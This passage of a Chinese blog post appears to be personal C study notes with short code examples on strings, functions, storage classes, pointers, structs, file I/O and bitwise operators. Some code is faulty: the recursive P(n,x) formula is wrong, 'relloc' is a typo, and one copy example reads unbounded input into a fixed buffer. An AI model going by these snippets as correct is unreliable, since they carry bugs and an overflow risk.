class="string">'\0'</span>))i++;</span><br><span class="line">  <span class="keyword">if</span> (s1[i]==<span class="string">'\0'</span> &amp;&amp; s2[i]==<span class="string">'\0'</span>)</span><br><span class="line">      resu=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      resu=s1[i]-s2[i];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nresult:%d.\n"</span>,resu);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/26/C_C++_01/20200227164220.png" alt><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strcpy实现 运用了strlen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> s1[<span class="number">80</span>],s2[<span class="number">80</span>];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input s2:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s2);</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="built_in">strlen</span>(s2);i++)</span><br><span class="line">     s1[i]=s2[i];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"s1:%s\n"</span>,s1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="8-函数"><a href="#8-函数" class="headerlink" title="8 函数"></a>8 函数</h2><h3 id="8-1-定义函数"><a href="#8-1-定义函数" class="headerlink" title="8.1 定义函数"></a>8.1 定义函数</h3>定义函数别忘了声明函数<h3 id="8-2-数组作为函数参数"><a href="#8-2-数组作为函数参数" class="headerlink" title="8.2 数组作为函数参数"></a>8.2 数组作为函数参数</h3>数组名作为函数参数时，传递的是数组首元素的地址，也就是说形参的值改变，实参的值也改变<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">float</span> score[<span class="number">10</span>];</span><br><span class="line">average(score);</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span> average(<span class="built_in">float</span> <span class="built_in">array</span>[<span class="number">10</span>])&#123;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="8-3-局部变量和全局变量"><a href="#8-3-局部变量和全局变量" class="headerlink" title="8.3 局部变量和全局变量"></a>8.3 局部变量和全局变量</h3><h4 id="8-3-1-局部变量"><a href="#8-3-1-局部变量" class="headerlink" title="8.3.1 局部变量"></a>8.3.1 局部变量</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）在一个函数内部定义即为局部变量</span><br><span class="line">（<span class="number">2</span>）形式参数也是局部变量</span><br></pre></td></tr></table></figure><h4 id="8-3-2-全局变量"><a href="#8-3-2-全局变量" class="headerlink" title="8.3.2 全局变量"></a>8.3.2 全局变量</h4><p>在函数外部定义</p><p>为区别全局变量和局部变量，习惯将全局变量的第一个字母用大写表示</p><h3 id="8-4-变量的存储方式和生存期"><a href="#8-4-变量的存储方式和生存期" class="headerlink" title="8.4 变量的存储方式和生存期"></a>8.4 变量的存储方式和生存期</h3><h4 id="8-4-1-动态存储方式和静态存储方式"><a href="#8-4-1-动态存储方式和静态存储方式" class="headerlink" title="8.4.1 动态存储方式和静态存储方式"></a>8.4.1 动态存储方式和静态存储方式</h4><p>静态存储方式是指在程序运行期间由系统分配的固定的存储空间，动态存储方式是在程序运行期间根据需要进行动态分配</p><p>C 的存储类别包括四种：自动(auto)，静态(static)，寄存器(register)，外部(extern)</p><h4 id="8-4-2-局部变量存储类别"><a href="#8-4-2-局部变量存储类别" class="headerlink" title="8.4.2 局部变量存储类别"></a>8.4.2 局部变量存储类别</h4><ol><li>自动变量(auto 变量)<br>默认为自动变量，在调用该函数时，系统会给这些变量分配存储空间，在函数调用结束时就自动释放这些存储空间。</li><li>静态局部变量(static 局部变量)<br>局部变量的值在调用结束后不消失，下一次再调用该函数时，使用该值。</li></ol><p>==注意==</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽静态局部变量在函数结束调用后仍存在，但其他函数不能调用它。</span><br></pre></td></tr></table></figure><ol start="3"><li>寄存器变量(register)<br><img src="/2020/01/26/C_C++_01/20200229143900.png" alt><h4 id="8-3-3-全局变量存储方式"><a href="#8-3-3-全局变量存储方式" class="headerlink" title="8.3.3 全局变量存储方式"></a>8.3.3 全局变量存储方式</h4>全局变量都存储在静态存储区中</li></ol><p>拓展外部变量的作用域：</p><ol><li>在一个文件内拓展<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 A,B,C 使用范围拓展到定义之前</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> A,B,C;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> A,B,C</span><br></pre></td></tr></table></figure></li><li>拓展到其他文件<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">file1</span>:<span class="string"></span></span><br><span class="line"><span class="attr">int</span> <span class="string">A;</span></span><br><span class="line"><span class="attr">int</span> <span class="string">main()&#123;</span></span><br><span class="line">    <span class="attr">……</span></span><br><span class="line"><span class="attr">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">file2</span>:<span class="string"></span></span><br><span class="line"><span class="attr">extern</span> <span class="string">A;</span></span><br><span class="line"><span class="attr">……</span></span><br></pre></td></tr></table></figure></li><li>将外部变量作用域限制在本文件中<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 添加static声明</span></span><br><span class="line">file1:</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> A;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file2:</span><br><span class="line"><span class="keyword">extern</span> A;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h3 id="8-5-内部函数和外部函数"><a href="#8-5-内部函数和外部函数" class="headerlink" title="8.5 内部函数和外部函数"></a>8.5 内部函数和外部函数</h3><h3 id="8-6-习题（第七章）"><a href="#8-6-习题（第七章）" class="headerlink" title="8.6 习题（第七章）"></a>8.6 习题（第七章）</h3><img src="/2020/01/26/C_C++_01/20200301142506.png" alt><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数递归应用</span></span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line">double <span class="constructor">P(<span class="params">int</span> <span class="params">n</span>,<span class="params">int</span> <span class="params">x</span>)</span>;</span><br><span class="line"><span class="built_in">int</span> main<span class="literal">()</span>&#123;</span><br><span class="line">    <span class="built_in">int</span> n,x;</span><br><span class="line">    double result;</span><br><span class="line">    printf(<span class="string">"n,x:"</span>);</span><br><span class="line">    scanf(<span class="string">"%d,%d"</span>,&amp;n,&amp;x);</span><br><span class="line">    result=<span class="constructor">P(<span class="params">n</span>,<span class="params">x</span>)</span>;</span><br><span class="line">    printf(<span class="string">"%f"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line">double <span class="constructor">P(<span class="params">int</span> <span class="params">n</span>,<span class="params">int</span> <span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">        return <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        return (<span class="number">2</span>*n-<span class="number">1</span>)*x-<span class="constructor">P(<span class="params">n</span>-1,<span class="params">x</span>)</span>-(n-<span class="number">1</span>)*<span class="constructor">P(<span class="params">n</span>-2,<span class="params">x</span>)</span>/n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">!<span class="literal">[]</span>(./C_C++_01/<span class="number">20200301143808.</span>png)</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="function"><span class="keyword">void</span> <span class="title">convert</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">  <span class="keyword">int</span> number;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input an integer: "</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;number);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"output: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (number&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;<span class="built_in">putchar</span>(<span class="string">'-'</span>);<span class="built_in">putchar</span>(<span class="string">' '</span>);   <span class="comment">/* 先输出一个‘-’号和空格 */</span></span><br><span class="line">     number=-number;</span><br><span class="line">    &#125;</span><br><span class="line">  convert(number);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">convert</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">if</span> ((i=n/<span class="number">10</span>)!=<span class="number">0</span>)</span><br><span class="line">    convert(i);</span><br><span class="line">  <span class="built_in">putchar</span>(n%<span class="number">10</span>+<span class="string">'0'</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-指针"><a href="#9-指针" class="headerlink" title="9 指针"></a>9 指针</h2><h3 id="9-1-指针变量"><a href="#9-1-指针变量" class="headerlink" title="9.1 指针变量"></a>9.1 指针变量</h3><ol><li>定义<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> *point_1, *point_2;</span><br></pre></td></tr></table></figure></li><li>引用指针变量<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p</span>=&amp;a;</span><br><span class="line">*<span class="attribute">p</span>=1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1)&amp; 取地址符</span><br><span class="line">(2)* 指针运算符(或间接访问运算符),*p代表指针变量p指向的对象</span><br></pre></td></tr></table></figure></li><li>指针变量作函数参数<br>实现了调用函数使变量的值发生变化，在main函数中就可以使用这些改变了的值</li></ol><h3 id="9-2-指针引用数组"><a href="#9-2-指针引用数组" class="headerlink" title="9.2 指针引用数组"></a>9.2 指针引用数组</h3><ol><li>数组元素的指针<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> *p;</span><br><span class="line"><span class="built_in">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">p=a;    <span class="comment">//将a数组首元素的指针赋给p</span></span><br><span class="line">或</span><br><span class="line">p=&amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure></li><li>数组元素指针的计算<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p++;    <span class="comment">//指向下一个元素地址</span></span><br><span class="line">p--;    <span class="comment">//指向前一个元素地址</span></span><br></pre></td></tr></table></figure></li><li>指向多维数组</li></ol><h3 id="9-3-指针引用字符串"><a href="#9-3-指针引用字符串" class="headerlink" title="9.3 指针引用字符串"></a>9.3 指针引用字符串</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span>=<span class="string">"I love China"</span>;</span><br></pre></td></tr></table></figure><h3 id="9-4-内存动态分配"><a href="#9-4-内存动态分配" class="headerlink" title="9.4 内存动态分配"></a>9.4 内存动态分配</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li>malloc<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">或 <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">100</span>);    <span class="comment">//开辟100字节临时分配空间</span></span><br></pre></td></tr></table></figure></li><li>calloc<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=calloc(<span class="number">50</span>,<span class="number">4</span>);     <span class="comment">//分配50个4字节空间</span></span><br></pre></td></tr></table></figure></li><li>free<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);    <span class="comment">//释放空间</span></span><br></pre></td></tr></table></figure></li><li>realloc<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">relloc(p,<span class="number">50</span>);   <span class="comment">//改变分配空间的大小</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="10-结构体"><a href="#10-结构体" class="headerlink" title="10 结构体"></a>10 结构体</h2><h3 id="10-1-定义和使用"><a href="#10-1-定义和使用" class="headerlink" title="10.1 定义和使用"></a>10.1 定义和使用</h3><p>定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="keyword">char</span> sex;</span><br><span class="line">&#125; student1,student2;    <span class="comment">//  注意分号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">student1</span>,<span class="title">student2</span>;</span></span><br></pre></td></tr></table></figure><p>初始化和使用</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">student1</span>=&#123;<span class="number">11011</span>,<span class="string">'M'</span>&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">student.num</span>=<span class="number">10010</span><span class="comment">;  //使用 . 引用结构体内变量</span></span><br></pre></td></tr></table></figure><h3 id="10-2-结构体指针"><a href="#10-2-结构体指针" class="headerlink" title="10.2 结构体指针"></a>10.2 结构体指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">stu_1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> *<span class="title">p</span>;</span></span><br><span class="line">p=&amp;stu_1;</span><br></pre></td></tr></table></figure><p>引用结构体中变量三种方法：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)stu.num</span><br><span class="line">(<span class="number">2</span>)(*p).num</span><br><span class="line">(<span class="number">3</span>)p-&gt;num   <span class="comment">//替代了第二种写法, '-&gt;' 称为指向运算符</span></span><br></pre></td></tr></table></figure><h3 id="10-3-共用体类型"><a href="#10-3-共用体类型" class="headerlink" title="10.3 共用体类型"></a>10.3 共用体类型</h3><p>共享一段内存的结构，后一个数据会覆盖前面的数据</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Data</span>&#123;</span></span><br><span class="line">    int i;</span><br><span class="line">    char ch;</span><br><span class="line">    float f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-4-枚举类型"><a href="#10-4-枚举类型" class="headerlink" title="10.4 枚举类型"></a>10.4 枚举类型</h3><p>一个变量只有几种可能的值</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span>&#123;<span class="title">sun</span>,<span class="title">mon</span>,<span class="title">tue</span>,<span class="title">wed</span>,<span class="title">thu</span>,<span class="title">fri</span>,<span class="title">sat</span>&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-typedef声明新类型名"><a href="#10-5-typedef声明新类型名" class="headerlink" title="10.5 typedef声明新类型名"></a>10.5 typedef声明新类型名</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一般用法：</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Integer;</span><br><span class="line"></span><br><span class="line">结构体;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> mouth;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">&#125;Date;</span><br></pre></td></tr></table></figure><h2 id="11-文件输入输出"><a href="#11-文件输入输出" class="headerlink" title="11 文件输入输出"></a>11 文件输入输出</h2><p>文件类型指针 <code>stdio.h</code></p><h3 id="11-1-打开与关闭文件"><a href="#11-1-打开与关闭文件" class="headerlink" title="11.1 打开与关闭文件"></a>11.1 打开与关闭文件</h3><p>fopen打开文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE *fp;</span><br><span class="line">fp=fopen(<span class="string">"al"</span>,<span class="string">"r"</span>); <span class="comment">//注意双引号</span></span><br></pre></td></tr></table></figure><p>文件使用方式<br><img src="/2020/01/26/C_C++_01/20200304115946.png" alt><br>fclose关闭文件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fclose(<span class="name">fp</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-顺序读写文件"><a href="#11-2-顺序读写文件" class="headerlink" title="11.2 顺序读写文件"></a>11.2 顺序读写文件</h3><h4 id="11-2-1-读写字符"><a href="#11-2-1-读写字符" class="headerlink" title="11.2.1 读写字符"></a>11.2.1 读写字符</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fgetc<span class="comment">(fp)</span>;</span><br><span class="line">fputc<span class="comment">(ch,fp)</span>;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">getc<span class="comment">(fp)</span>;   <span class="comment">//stdio.h 中宏定义，和fgetc相同</span></span><br><span class="line">putc<span class="comment">(ch,fp)</span>;</span><br></pre></td></tr></table></figure><h4 id="11-2-2-读写字符串"><a href="#11-2-2-读写字符串" class="headerlink" title="11.2.2 读写字符串"></a>11.2.2 读写字符串</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(<span class="name">str</span>,n,fp)<span class="comment">;</span></span><br><span class="line">fputs(<span class="name">str</span>,fp)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="11-2-3-格式化读写文件"><a href="#11-2-3-格式化读写文件" class="headerlink" title="11.2.3 格式化读写文件"></a>11.2.3 格式化读写文件</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscanf(<span class="name">fp</span>,<span class="string">"%d %f"</span>,<span class="symbol">&amp;i</span>,<span class="symbol">&amp;f</span>)<span class="comment">;</span></span><br><span class="line">fprintf(<span class="name">fp</span>,<span class="string">"%d,%6.2f"</span>,i,f)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="11-2-4-二进制方式读写数据"><a href="#11-2-4-二进制方式读写数据" class="headerlink" title="11.2.4 二进制方式读写数据"></a>11.2.4 二进制方式读写数据</h4><p><img src="/2020/01/26/C_C++_01/20200304122629.png" alt></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fread(<span class="name">&amp;stud</span>[i],sizeof(<span class="name">struct</span> Student_type),<span class="number">1</span>,fp)<span class="comment">;</span></span><br><span class="line">fwrite(<span class="name">&amp;stud</span>[i],sizeof(<span class="name">struct</span> Student_type),<span class="number">1</span>,fp)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="11-3-文件位置标记与随机读写"><a href="#11-3-文件位置标记与随机读写" class="headerlink" title="11.3 文件位置标记与随机读写"></a>11.3 文件位置标记与随机读写</h3><ol><li>rewind 使文件位置标记指向文件开头<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rewind(<span class="name">fp1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li>fseek改变文件位置标记<br><img src="/2020/01/26/C_C++_01/20200304123206.png" alt></li><li>ftell测定当前文件标记位置<br><img src="/2020/01/26/C_C++_01/20200304123320.png" alt></li></ol><h3 id="11-4-文件读写的出错检测"><a href="#11-4-文件读写的出错检测" class="headerlink" title="11.4 文件读写的出错检测"></a>11.4 文件读写的出错检测</h3><p><img src="/2020/01/26/C_C++_01/20200304123540.png" alt></p><h2 id="12-位运算"><a href="#12-位运算" class="headerlink" title="12 位运算"></a>12 位运算</h2><h3 id="12-1-按位与-amp"><a href="#12-1-按位与-amp" class="headerlink" title="12.1 按位与(&amp;)"></a>12.1 按位与(&amp;)</h3><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=<span class="number">077</span>;</span><br><span class="line">    b=a&amp;<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\40: The a &amp; b(decimal) is %d \n"</span>,b);</span><br><span class="line">    b&amp;=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\40: The a &amp; b(decimal) is %d \n"</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">: The a &amp; b(decimal) <span class="keyword">is</span> <span class="number">3</span></span><br><span class="line">: The a &amp; b(decimal) <span class="keyword">is</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="12-2-按位或"><a href="#12-2-按位或" class="headerlink" title="12.2 按位或(|)"></a>12.2 按位或(|)</h3><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=<span class="number">077</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</span><br><span class="line">    b=a|<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\40: The a &amp; b(decimal) is %d \n"</span>,b);</span><br><span class="line">    b|=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\40: The a &amp; b(decimal) is %d \n"</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">63</span> : The a &amp; b(decimal) <span class="keyword">is</span> <span class="number">63</span></span><br><span class="line"> : The a &amp; b(decimal) <span class="keyword">is</span> <span class="number">63</span></span><br></pre></td></tr></table></figure><h3 id="12-3-异或"><a href="#12-3-异或" class="headerlink" title="12.3 异或(^)"></a>12.3 异或(^)</h3><p>同 0 异 1</p><p><strong>代码</strong></p><figure class="highlight 